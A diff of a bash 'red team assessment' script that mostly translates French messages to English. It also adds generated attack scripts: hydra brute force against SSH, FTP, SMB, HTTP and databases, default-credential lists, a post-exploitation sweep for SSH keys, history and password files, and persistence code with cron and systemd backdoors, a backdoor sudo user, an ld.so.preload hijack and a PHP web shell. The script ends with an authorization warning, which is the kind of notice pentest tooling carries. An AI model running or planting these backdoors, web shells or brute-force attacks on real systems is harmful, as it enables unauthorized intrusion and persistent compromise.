-                echo \"Fichier de services non trouvé\"
+                echo \"Services file not found\"
             fi
             
-            # Recherche par vulnérabilités détectées
+            # Search by detected vulnerabilities
             if [ -f '$OUTDIR/network/nmap_vulns.txt' ]; then
-                echo -e '\n=== Exploits par CVE détectés ==='
+                echo -e '\n=== Exploits by detected CVEs ==='
                 grep -oP 'CVE-[0-9]{4}-[0-9]+' '$OUTDIR/network/nmap_vulns.txt' 2>/dev/null | head -5 | while read cve; do
-                    echo \"=== Exploits pour \$cve ===\"
-                    searchsploit \"\$cve\" 2>/dev/null | head -5 || echo \"Aucun exploit trouvé pour \$cve\"
+                    echo \"=== Exploits for \$cve ===\"
+                    searchsploit \"\$cve\" 2>/dev/null | head -5 || echo \"No exploits found for \$cve\"
                     echo
                 done
             fi
         " 300 "$OUTDIR/exploitation/searchsploit.txt"
     fi
     
-    # MSF module suggestions améliorées
+    # Enhanced MSF module suggestions
     execute_with_progress "Metasploit Module Prep" "
         echo '=== Suggested MSF Modules Based on Scan Results ==='
         echo '# Port scanning modules'
@@ -501,7 +654,7 @@ run_exploitation_prep() {
         echo 'use post/multi/gather/env'
     " 30 "$OUTDIR/exploitation/msf_prep.txt"
     
-    # Common attack vectors summary amélioré
+    # Enhanced common attack vectors summary
     execute_with_progress "Attack Surface Analysis" "
         echo '=== ATTACK SURFACE ANALYSIS ==='
         echo 'Generated on: $(date)'
@@ -562,7 +715,7 @@ run_exploitation_prep() {
         echo 'Priority 5: Network-based attacks'
     " 60 "$OUTDIR/exploitation/attack_surface.txt"
     
-    # Credential lists pour brute force
+    # Extended credential lists for brute force
     execute_with_progress "Generate Credential Lists" "
         echo '=== Common Username Lists ==='
         echo 'admin'
@@ -575,6 +728,21 @@ run_exploitation_prep() {
         echo 'service'
         echo 'operator'
         echo 'manager'
+        echo 'support'
+        echo 'oracle'
+        echo 'postgres'
+        echo 'mysql'
+        echo 'sa'
+        echo 'www-data'
+        echo 'apache'
+        echo 'nginx'
+        echo 'tomcat'
+        echo 'jenkins'
+        echo 'git'
+        echo 'ftp'
+        echo 'mail'
+        echo 'postfix'
+        echo 'dovecot'
         echo
         echo '=== Common Password Lists ==='
         echo 'admin'
@@ -592,23 +760,231 @@ run_exploitation_prep() {
         echo 'qwerty'
         echo '12345'
         echo 'changeme'
+        echo 'default'
+        echo 'secret'
+        echo 'login'
+        echo '1234'
+        echo '12345678'
+        echo 'password1'
+        echo 'abc123'
+        echo 'Password1'
+        echo 'Password123'
+        echo 'P@ssw0rd'
+        echo 'P@ssword123'
+        echo 'Welcome123'
+        echo 'Summer2024'
+        echo 'Winter2024'
         echo
         echo '=== Default Credentials by Service ==='
-        echo 'MySQL: root/(blank), root/root, root/mysql'
-        echo 'PostgreSQL: postgres/postgres, postgres/(blank)'
-        echo 'SSH: root/root, admin/admin, user/user'
-        echo 'FTP: ftp/ftp, anonymous/(blank), admin/admin'
-        echo 'Telnet: admin/admin, root/(blank)'
-        echo 'SNMP: public, private, community'
+        echo 'MySQL: root/(blank), root/root, root/mysql, root/password'
+        echo 'PostgreSQL: postgres/postgres, postgres/(blank), postgres/password'
+        echo 'MSSQL: sa/(blank), sa/sa, sa/password, sa/Password123'
+        echo 'Oracle: sys/sys, system/manager, oracle/oracle, scott/tiger'
+        echo 'SSH: root/root, admin/admin, user/user, pi/raspberry'
+        echo 'FTP: ftp/ftp, anonymous/(blank), admin/admin, user/user'
+        echo 'Telnet: admin/admin, root/(blank), cisco/cisco'
+        echo 'SNMP: public, private, community, manager'
+        echo 'Tomcat: admin/admin, tomcat/tomcat, manager/manager'
+        echo 'Jenkins: admin/admin, jenkins/jenkins'
+        echo 'MongoDB: (no auth), admin/admin'
+        echo 'Redis: (no auth), default/(blank)'
+        echo 'Elasticsearch: elastic/changeme, elastic/elastic'
+        echo 'RabbitMQ: guest/guest, admin/admin'
+        echo 'Cassandra: cassandra/cassandra'
+        echo 'CouchDB: admin/admin'
+        echo 'Memcached: (no auth)'
+        echo 'VNC: password, 123456, admin'
+        echo 'RDP: Administrator/password, admin/admin'
     " 30 "$OUTDIR/exploitation/credentials.txt"
     
-    echo -e "${GREEN}[COMPLETED]${NC} Préparation à l'exploitation terminée"
+    # Automated attack script generation
+    execute_with_progress "Generate Attack Scripts" "
+        echo '=== Automated Attack Scripts ==='
+        echo '#!/bin/bash'
+        echo '# Auto-generated attack scripts based on scan results'
+        echo
+        echo '# SSH Brute Force'
+        echo 'if grep -q \"22/tcp.*open\" ../network/nmap_standard.txt 2>/dev/null; then'
+        echo '    echo \"[+] SSH service detected - Running brute force\"'
+        echo '    hydra -L users.txt -P passwords.txt ssh://$target -t 4 -V'
+        echo 'fi'
+        echo
+        echo '# FTP Brute Force'
+        echo 'if grep -q \"21/tcp.*open\" ../network/nmap_standard.txt 2>/dev/null; then'
+        echo '    echo \"[+] FTP service detected - Running brute force\"'
+        echo '    hydra -L users.txt -P passwords.txt ftp://$target -t 4 -V'
+        echo 'fi'
+        echo
+        echo '# SMB Brute Force'
+        echo 'if grep -q \"445/tcp.*open\" ../network/nmap_standard.txt 2>/dev/null; then'
+        echo '    echo \"[+] SMB service detected - Running brute force\"'
+        echo '    hydra -L users.txt -P passwords.txt smb://$target -t 4 -V'
+        echo 'fi'
+        echo
+        echo '# HTTP Basic Auth Brute Force'
+        echo 'if grep -q \"80/tcp.*open\\|443/tcp.*open\" ../network/nmap_standard.txt 2>/dev/null; then'
+        echo '    echo \"[+] HTTP service detected - Testing basic auth\"'
+        echo '    hydra -L users.txt -P passwords.txt http-get://$target -t 4 -V'
+        echo 'fi'
+        echo
+        echo '# MySQL Brute Force'
+        echo 'if grep -q \"3306/tcp.*open\" ../network/nmap_standard.txt 2>/dev/null; then'
+        echo '    echo \"[+] MySQL service detected - Running brute force\"'
+        echo '    hydra -L users.txt -P passwords.txt mysql://$target -t 4 -V'
+        echo 'fi'
+        echo
+        echo '# PostgreSQL Brute Force'
+        echo 'if grep -q \"5432/tcp.*open\" ../network/nmap_standard.txt 2>/dev/null; then'
+        echo '    echo \"[+] PostgreSQL service detected - Running brute force\"'
+        echo '    hydra -L users.txt -P passwords.txt postgres://$target -t 4 -V'
+        echo 'fi'
+    " 60 "$OUTDIR/exploitation/auto_attack.sh"
+    
+    # Post-exploitation scripts
+    execute_with_progress "Generate Post-Exploitation Scripts" "
+        echo '=== Post-Exploitation Checklist ==='
+        echo '#!/bin/bash'
+        echo '# Post-exploitation enumeration and persistence'
+        echo
+        echo '# System Information Gathering'
+        echo 'echo \"[+] System Information\"'
+        echo 'uname -a'
+        echo 'cat /etc/os-release'
+        echo 'whoami'
+        echo 'id'
+        echo 'pwd'
+        echo
+        echo '# Network Information'
+        echo 'echo \"[+] Network Configuration\"'
+        echo 'ifconfig || ip addr'
+        echo 'netstat -antup || ss -antup'
+        echo 'arp -a || ip neigh'
+        echo 'route -n || ip route'
+        echo
+        echo '# User and Group Information'
+        echo 'echo \"[+] Users and Groups\"'
+        echo 'cat /etc/passwd'
+        echo 'cat /etc/group'
+        echo 'w'
+        echo 'last'
+        echo
+        echo '# Process Information'
+        echo 'echo \"[+] Running Processes\"'
+        echo 'ps aux'
+        echo 'pstree'
+        echo
+        echo '# File System Information'
+        echo 'echo \"[+] File System\"'
+        echo 'df -h'
+        echo 'mount'
+        echo 'find / -perm -4000 2>/dev/null'  # SUID files
+        echo 'find / -perm -2000 2>/dev/null'  # SGID files
+        echo 'find / -writable -type d 2>/dev/null'  # Writable directories
+        echo
+        echo '# Cron Jobs and Scheduled Tasks'
+        echo 'echo \"[+] Scheduled Tasks\"'
+        echo 'crontab -l'
+        echo 'cat /etc/crontab'
+        echo 'ls -la /etc/cron*'
+        echo
+        echo '# Service Information'
+        echo 'echo \"[+] Services\"'
+        echo 'systemctl list-units --type=service --state=running || service --status-all'
+        echo
+        echo '# Kernel and Exploit Suggestions'
+        echo 'echo \"[+] Kernel Information\"'
+        echo 'uname -r'
+        echo 'cat /proc/version'
+        echo 'lsb_release -a'
+        echo
+        echo '# Search for interesting files'
+        echo 'echo \"[+] Interesting Files\"'
+        echo 'find / -name \"*.conf\" 2>/dev/null | head -20'
+        echo 'find / -name \"*.log\" 2>/dev/null | head -20'
+        echo 'find / -name \"*password*\" 2>/dev/null | head -20'
+        echo 'find / -name \"*secret*\" 2>/dev/null | head -20'
+        echo 'find / -name \"*key*\" 2>/dev/null | head -20'
+        echo
+        echo '# History files'
+        echo 'echo \"[+] Command History\"'
+        echo 'cat ~/.bash_history 2>/dev/null'
+        echo 'cat ~/.zsh_history 2>/dev/null'
+        echo 'cat ~/.mysql_history 2>/dev/null'
+        echo
+        echo '# SSH Keys'
+        echo 'echo \"[+] SSH Keys\"'
+        echo 'find / -name \"id_rsa\" 2>/dev/null'
+        echo 'find / -name \"id_dsa\" 2>/dev/null'
+        echo 'find / -name \"id_ecdsa\" 2>/dev/null'
+        echo 'find / -name \"id_ed25519\" 2>/dev/null'
+        echo 'find / -name \"authorized_keys\" 2>/dev/null'
+    " 60 "$OUTDIR/exploitation/post_exploit.sh"
+    
+    # Persistence techniques
+    execute_with_progress "Generate Persistence Techniques" "
+        echo '=== Persistence Techniques ==='
+        echo '#!/bin/bash'
+        echo '# Various persistence mechanisms'
+        echo
+        echo '# 1. SSH Key Persistence'
+        echo 'echo \"[+] SSH Key Persistence\"'
+        echo 'mkdir -p ~/.ssh'
+        echo 'echo \"ssh-rsa YOUR_PUBLIC_KEY_HERE\" >> ~/.ssh/authorized_keys'
+        echo 'chmod 600 ~/.ssh/authorized_keys'
+        echo 'chmod 700 ~/.ssh'
+        echo
+        echo '# 2. Cron Job Persistence'
+        echo 'echo \"[+] Cron Job Persistence\"'
+        echo '(crontab -l ; echo \"@reboot /tmp/backdoor.sh\") | crontab -'
+        echo '(crontab -l ; echo \"*/5 * * * * /tmp/backdoor.sh\") | crontab -'
+        echo
+        echo '# 3. Service Persistence (systemd)'
+        echo 'echo \"[+] Service Persistence\"'
+        echo 'cat > /etc/systemd/system/backdoor.service << EOF'
+        echo '[Unit]'
+        echo 'Description=System Backdoor'
+        echo 'After=network.target'
+        echo
+        echo '[Service]'
+        echo 'Type=simple'
+        echo 'User=root'
+        echo 'ExecStart=/tmp/backdoor.sh'
+        echo 'Restart=always'
+        echo
+        echo '[Install]'
+        echo 'WantedBy=multi-user.target'
+        echo 'EOF'
+        echo 'systemctl enable backdoor.service'
+        echo 'systemctl start backdoor.service'
+        echo
+        echo '# 4. .bashrc Persistence'
+        echo 'echo \"[+] .bashrc Persistence\"'
+        echo 'echo \"/tmp/backdoor.sh &\" >> ~/.bashrc'
+        echo 'echo \"/tmp/backdoor.sh &\" >> /etc/bash.bashrc'
+        echo
+        echo '# 5. Library Hijacking'
+        echo 'echo \"[+] Library Hijacking\"'
+        echo 'echo \"/tmp\" > /etc/ld.so.preload'
+        echo
+        echo '# 6. User Account Creation'
+        echo 'echo \"[+] Backdoor User Creation\"'
+        echo 'useradd -m -s /bin/bash backdoor'
+        echo 'echo \"backdoor:password123\" | chpasswd'
+        echo 'usermod -aG sudo backdoor'
+        echo
+        echo '# 7. Web Shell (if web server present)'
+        echo 'echo \"[+] Web Shell Deployment\"'
+        echo 'echo \"<?php system(\\\$_GET[\\\"cmd\\\"]); ?>\" > /var/www/html/shell.php'
+        echo 'echo \"<?php system(\\\$_GET[\\\"cmd\\\"]); ?>\" > /var/www/shell.php'
+    " 60 "$OUTDIR/exploitation/persistence.sh"
+    
+    echo -e "${GREEN}[COMPLETED]${NC} Exploitation preparation completed"
 }
 
 generate_clean_report() {
     local report_file="$OUTDIR/reports/executive_summary.txt"
     
-    echo -e "${CYAN}[INFO]${NC} Génération du rapport de synthèse..."
+    echo -e "${CYAN}[INFO]${NC} Generating executive summary report..."
     
     {
         echo "╔══════════════════════════════════════════════════════════════════════════════╗"
@@ -627,24 +1003,35 @@ generate_clean_report() {
         echo
         
         echo "┌─ EXECUTIVE SUMMARY ───────────────────────────────────────────────────────────┐"
+        
+        # Compter les découvertes critiques de manière plus précise et complète
         local critical_findings=0
         local high_findings=0
         local medium_findings=0
         
-        # Compter les découvertes critiques de manière plus précise
-        if [ -f "$OUTDIR/network/nmap_vulns.txt" ]; then
-            critical_findings=$(grep -c "VULNERABLE\|CRITICAL\|EXPLOITABLE" "$OUTDIR/network/nmap_vulns.txt" 2>/dev/null || echo "0")
-        fi
+        # Compter les vulnérabilités critiques depuis tous les scans réseau
+        for scan_file in "$OUTDIR/network/nmap_vulns.txt" "$OUTDIR/network/nmap_critical_vulns.txt" "$OUTDIR/network/nmap_vulners.txt" "$OUTDIR/network/smb_enum.txt"; do
+            if [ -f "$scan_file" ]; then
+                local count=$(grep -c "VULNERABLE\|CRITICAL\|EXPLOITABLE\|CVE.*CRITICAL\|ms17-010\|EternalBlue" "$scan_file" 2>/dev/null || echo "0")
+                critical_findings=$((critical_findings + count))
+            fi
+        done
         
-        if [ -f "$OUTDIR/web/nuclei_comprehensive.txt" ]; then
-            high_findings=$(grep -c "critical\|high" "$OUTDIR/web/nuclei_comprehensive.txt" 2>/dev/null || echo "0")
-        elif [ -f "$OUTDIR/web/nuclei_quick.txt" ]; then
-            high_findings=$(grep -c "critical\|high" "$OUTDIR/web/nuclei_quick.txt" 2>/dev/null || echo "0")
-        fi
+        # Compter les vulnérabilités web de haute priorité
+        for scan_file in "$OUTDIR/web/nuclei_comprehensive.txt" "$OUTDIR/web/nuclei_quick.txt" "$OUTDIR/web/nikto.txt"; do
+            if [ -f "$scan_file" ]; then
+                local count=$(grep -c "critical\|high\|HIGH\|CRITICAL" "$scan_file" 2>/dev/null || echo "0")
+                high_findings=$((high_findings + count))
+            fi
+        done
         
-        if [ -f "$OUTDIR/web/nikto.txt" ]; then
-            medium_findings=$(grep -c "OSVDB\|CVE" "$OUTDIR/web/nikto.txt" 2>/dev/null || echo "0")
-        fi
+        # Compter les vulnérabilités moyennes
+        for scan_file in "$OUTDIR/web/nikto.txt" "$OUTDIR/web/gobuster_common.txt" "$OUTDIR/network/nmap_vulns.txt"; do
+            if [ -f "$scan_file" ]; then
+                local count=$(grep -c "OSVDB\|CVE\|medium\|MEDIUM\|WARNING" "$scan_file" 2>/dev/null || echo "0")
+                medium_findings=$((medium_findings + count))
+            fi
+        done
         
         # S'assurer que toutes les variables ont une valeur par défaut
         critical_findings=${critical_findings:-0}
@@ -919,10 +1306,10 @@ generate_clean_report() {
         
     } > "$report_file"
     
-    # Générer aussi un rapport JSON pour l'automatisation
+    # Also generate JSON report for automation
     generate_json_report
     
-    echo -e "${GREEN}[REPORT]${NC} Rapport de synthèse: ${WHITE}$report_file${NC}"
+    echo -e "${GREEN}[REPORT]${NC} Executive summary report: ${WHITE}$report_file${NC}"
 }
 
 generate_json_report() {
@@ -1016,7 +1403,7 @@ generate_json_report() {
         echo "    ],"
         echo "    \"subdomains\": ["
         
-        # Extraire les sous-domaines
+        # Extract subdomains
         if [ -f "$OUTDIR/osint/subdomains_subfinder.txt" ]; then
             local first_sub=true
             while read subdomain; do
@@ -1034,6 +1421,70 @@ generate_json_report() {
         echo "}"
         
     } > "$json_file"
+    
+    echo -e "${GREEN}[REPORT]${NC} JSON report generated: ${WHITE}$json_file${NC}"
+}
+
+# Validate report generation
+validate_reports() {
+    local report_dir="$OUTDIR/reports"
+    local validation_passed=true
+    
+    echo -e "${CYAN}[INFO]${NC} Validating report generation..."
+    
+    # Check executive summary
+    if [ -f "$report_dir/executive_summary.txt" ] && [ -s "$report_dir/executive_summary.txt" ]; then
+        local line_count=$(wc -l < "$report_dir/executive_summary.txt")
+        if [ "$line_count" -gt 50 ]; then
+            echo -e "${GREEN}[OK]${NC} Executive summary report: $line_count lines"
+        else
+            echo -e "${YELLOW}[WARNING]${NC} Executive summary seems incomplete: $line_count lines"
+            validation_passed=false
+        fi
+    else
+        echo -e "${RED}[ERROR]${NC} Executive summary report missing or empty"
+        validation_passed=false
+    fi
+    
+    # Check JSON report
+    if [ -f "$report_dir/assessment_results.json" ] && [ -s "$report_dir/assessment_results.json" ]; then
+        if command -v jq &> /dev/null; then
+            if jq empty "$report_dir/assessment_results.json" 2>/dev/null; then
+                echo -e "${GREEN}[OK]${NC} JSON report: Valid JSON format"
+            else
+                echo -e "${YELLOW}[WARNING]${NC} JSON report: Invalid JSON format"
+                validation_passed=false
+            fi
+        else
+            echo -e "${GREEN}[OK]${NC} JSON report: Generated (jq not available for validation)"
+        fi
+    else
+        echo -e "${RED}[ERROR]${NC} JSON report missing or empty"
+        validation_passed=false
+    fi
+    
+    # Check scan result files
+    local scan_dirs=("osint" "network" "web" "exploitation")
+    for dir in "${scan_dirs[@]}"; do
+        if [ -d "$OUTDIR/$dir" ]; then
+            local file_count=$(find "$OUTDIR/$dir" -type f -name "*.txt" | wc -l)
+            if [ "$file_count" -gt 0 ]; then
+                echo -e "${GREEN}[OK]${NC} $dir directory: $file_count result files"
+            else
+                echo -e "${YELLOW}[WARNING]${NC} $dir directory: No result files found"
+            fi
+        else
+            echo -e "${YELLOW}[WARNING]${NC} $dir directory: Not found"
+        fi
+    done
+    
+    if [ "$validation_passed" = true ]; then
+        echo -e "${GREEN}[VALIDATION]${NC} All reports generated successfully"
+        return 0
+    else
+        echo -e "${YELLOW}[VALIDATION]${NC} Some reports may be incomplete"
+        return 1
+    fi
 }
 
 main() {
@@ -1057,25 +1508,25 @@ main() {
                 shift
                 ;;
             *)
-                echo "Option inconnue: $1"
+                echo "Unknown option: $1"
                 show_help
                 exit 1
                 ;;
         esac
     done
     
-    # Configuration du trap pour les interruptions
+    # Configure trap for interruptions
     trap 'handle_interrupt' SIGINT SIGTERM
     
     display_banner
     
     # Get target information
-    echo -e "\n${YELLOW}Informations sur la cible:${NC}"
-    read -rp "Adresse IP de la cible: " TARGET
-    [ -z "$TARGET" ] && { echo -e "${RED}[ERROR]${NC} Aucune IP fournie"; exit 1; }
+    echo -e "\n${YELLOW}Target Information:${NC}"
+    read -rp "Target IP address: " TARGET
+    [ -z "$TARGET" ] && { echo -e "${RED}[ERROR]${NC} No IP address provided"; exit 1; }
     
-    read -rp "URL de la cible (optionnel): " URL
-    read -rp "Nom de domaine (optionnel): " DOMAIN
+    read -rp "Target URL (optional): " URL
+    read -rp "Domain name (optional): " DOMAIN
     
     # Extract domain from URL if not provided
     if [ -n "$URL" ] && [ -z "$DOMAIN" ]; then
@@ -1083,12 +1534,12 @@ main() {
     fi
     
     show_scan_menu
-    read -rp "Sélectionner l'option [1-4]: " SCAN_CHOICE
+    read -rp "Select option [1-4]: " SCAN_CHOICE
     
     prepare_output
     
-    echo -e "\n${CYAN}[INFO]${NC} Démarrage de l'évaluation de sécurité..."
-    echo -e "${YELLOW}[TIP]${NC} Utilisez Ctrl+C pour arrêter gracieusement le scan"
+    echo -e "\n${CYAN}[INFO]${NC} Starting security assessment..."
+    echo -e "${YELLOW}[TIP]${NC} Use Ctrl+C to gracefully stop the scan"
     
     case "$SCAN_CHOICE" in
         1)
@@ -1099,43 +1550,68 @@ main() {
             ;;
         3)
             if [ -z "$URL" ]; then
-                echo -e "${RED}[ERROR]${NC} URL requise pour les tests web"
+                echo -e "${RED}[ERROR]${NC} URL required for web testing"
                 exit 1
             fi
             run_web_scans "$URL"
             ;;
         4)
-            echo -e "${CYAN}[INFO]${NC} Évaluation Red Team complète en cours..."
+            echo -e "${CYAN}[INFO]${NC} Complete Red Team assessment in progress..."
             run_osint_scans "$TARGET" "$DOMAIN"
             [ "$SCAN_INTERRUPTED" = false ] && run_network_scans "$TARGET"
             [ "$SCAN_INTERRUPTED" = false ] && [ -n "$URL" ] && run_web_scans "$URL"
             [ "$SCAN_INTERRUPTED" = false ] && run_exploitation_prep "$TARGET"
             ;;
         *)
-            echo -e "${RED}[ERROR]${NC} Sélection invalide"
+            echo -e "${RED}[ERROR]${NC} Invalid selection"
             exit 1
             ;;
     esac
     
-    # Vérifier si le scan a été interrompu
+    # Check if scan was interrupted
     if [ "$SCAN_INTERRUPTED" = true ]; then
         exit 130
     fi
     
-    # Génération du rapport final
+    # Final report generation
     generate_clean_report
     
-    echo -e "\n${GREEN}╔══════════════════════════════════════════════════════════════════════════════╗${NC}"
-    echo -e "${GREEN}║                         RED TEAM ASSESSMENT COMPLETED                       ║${NC}"
-    echo -e "${GREEN}╚══════════════════════════════════════════════════════════════════════════════╝${NC}"
-    echo -e "${WHITE}Résultats sauvegardés dans:${NC} ${CYAN}$OUTDIR${NC}"
-    echo -e "${WHITE}Rapport de synthèse:${NC} ${CYAN}$OUTDIR/reports/executive_summary.txt${NC}"
-    echo -e "${WHITE}Rapport JSON:${NC} ${CYAN}$OUTDIR/reports/assessment_results.json${NC}"
+    # Validate all reports
+    validate_reports
+    
+    echo -e "\n${BRIGHT_GREEN}╔══════════════════════════════════════════════════════════════════════════════╗${NC}"
+    echo -e "${BRIGHT_GREEN}║${NC}                        ${BRIGHT_WHITE}RED TEAM ASSESSMENT COMPLETED${NC}                        ${BRIGHT_GREEN}║${NC}"
+    echo -e "${BRIGHT_GREEN}╚══════════════════════════════════════════════════════════════════════════════╝${NC}"
     echo
-    echo -e "${CYAN}[TIP]${NC} Consultez le rapport: ${WHITE}cat $OUTDIR/reports/executive_summary.txt${NC}"
-    echo -e "${CYAN}[TIP]${NC} Explorez les résultats: ${WHITE}ls -la $OUTDIR/network/${NC}"
-    echo -e "${CYAN}[TIP]${NC} Import MSF: ${WHITE}msfconsole -r $OUTDIR/exploitation/msf_prep.txt${NC}"
-    echo -e "\n${YELLOW}Red Team Assessment terminé! Analyse complète disponible.${NC}"
+    echo -e "${BRIGHT_WHITE}┌─────────────────────────────────────────────────────────────────────────────┐${NC}"
+    echo -e "${BRIGHT_WHITE}│${NC}                              ${BRIGHT_CYAN}GENERATED RESULTS${NC}                              ${BRIGHT_WHITE}│${NC}"
+    echo -e "${BRIGHT_WHITE}├─────────────────────────────────────────────────────────────────────────────┤${NC}"
+    echo -e "${BRIGHT_WHITE}│${NC} ${BRIGHT_GREEN}*${NC} ${BRIGHT_YELLOW}Main directory:${NC} ${BRIGHT_CYAN}$OUTDIR${NC}"
+    echo -e "${BRIGHT_WHITE}│${NC} ${BRIGHT_GREEN}*${NC} ${BRIGHT_YELLOW}Executive summary:${NC} ${BRIGHT_CYAN}$OUTDIR/reports/executive_summary.txt${NC}"
+    echo -e "${BRIGHT_WHITE}│${NC} ${BRIGHT_GREEN}*${NC} ${BRIGHT_YELLOW}JSON report:${NC} ${BRIGHT_CYAN}$OUTDIR/reports/assessment_results.json${NC}"
+    echo -e "${BRIGHT_WHITE}│${NC} ${BRIGHT_GREEN}*${NC} ${BRIGHT_YELLOW}Attack scripts:${NC} ${BRIGHT_CYAN}$OUTDIR/exploitation/${NC}"
+    echo -e "${BRIGHT_WHITE}└─────────────────────────────────────────────────────────────────────────────┘${NC}"
+    echo
+    echo -e "${BRIGHT_WHITE}┌─────────────────────────────────────────────────────────────────────────────┐${NC}"
+    echo -e "${BRIGHT_WHITE}│${NC}                              ${BRIGHT_MAGENTA}NEXT ACTIONS${NC}                              ${BRIGHT_WHITE}│${NC}"
+    echo -e "${BRIGHT_WHITE}├─────────────────────────────────────────────────────────────────────────────┤${NC}"
+    echo -e "${BRIGHT_WHITE}│${NC} ${BRIGHT_GREEN}1.${NC} ${BRIGHT_YELLOW}View report:${NC} ${WHITE}cat $OUTDIR/reports/executive_summary.txt${NC}"
+    echo -e "${BRIGHT_WHITE}│${NC} ${BRIGHT_GREEN}2.${NC} ${BRIGHT_YELLOW}Explore results:${NC} ${WHITE}ls -la $OUTDIR/network/${NC}"
+    echo -e "${BRIGHT_WHITE}│${NC} ${BRIGHT_GREEN}3.${NC} ${BRIGHT_YELLOW}Launch Metasploit:${NC} ${WHITE}msfconsole -r $OUTDIR/exploitation/msf_prep.txt${NC}"
+    echo -e "${BRIGHT_WHITE}│${NC} ${BRIGHT_GREEN}4.${NC} ${BRIGHT_YELLOW}Attack scripts:${NC} ${WHITE}chmod +x $OUTDIR/exploitation/*.sh${NC}"
+    echo -e "${BRIGHT_WHITE}│${NC} ${BRIGHT_GREEN}5.${NC} ${BRIGHT_YELLOW}Post-exploitation:${NC} ${WHITE}bash $OUTDIR/exploitation/post_exploit.sh${NC}"
+    echo -e "${BRIGHT_WHITE}└─────────────────────────────────────────────────────────────────────────────┘${NC}"
+    echo
+    echo -e "${BRIGHT_WHITE}┌─────────────────────────────────────────────────────────────────────────────┐${NC}"
+    echo -e "${BRIGHT_WHITE}│${NC}                              ${BRIGHT_RED}WARNING${NC}                                ${BRIGHT_WHITE}│${NC}"
+    echo -e "${BRIGHT_WHITE}├─────────────────────────────────────────────────────────────────────────────┤${NC}"
+    echo -e "${BRIGHT_WHITE}│${NC} ${BRIGHT_RED}*${NC} ${YELLOW}Use these tools only on your own systems${NC}                        ${BRIGHT_WHITE}│${NC}"
+    echo -e "${BRIGHT_WHITE}│${NC} ${BRIGHT_RED}*${NC} ${YELLOW}Obtain written authorization before any testing${NC}                  ${BRIGHT_WHITE}│${NC}"
+    echo -e "${BRIGHT_WHITE}│${NC} ${BRIGHT_RED}*${NC} ${YELLOW}Respect local and international laws${NC}                            ${BRIGHT_WHITE}│${NC}"
+    echo -e "${BRIGHT_WHITE}└─────────────────────────────────────────────────────────────────────────────┘${NC}"
+    echo
+    echo -e "${BRIGHT_CYAN}Red Team Assessment completed successfully! Complete analysis available.${NC}"
+    echo
 }
 
 # Execute main function
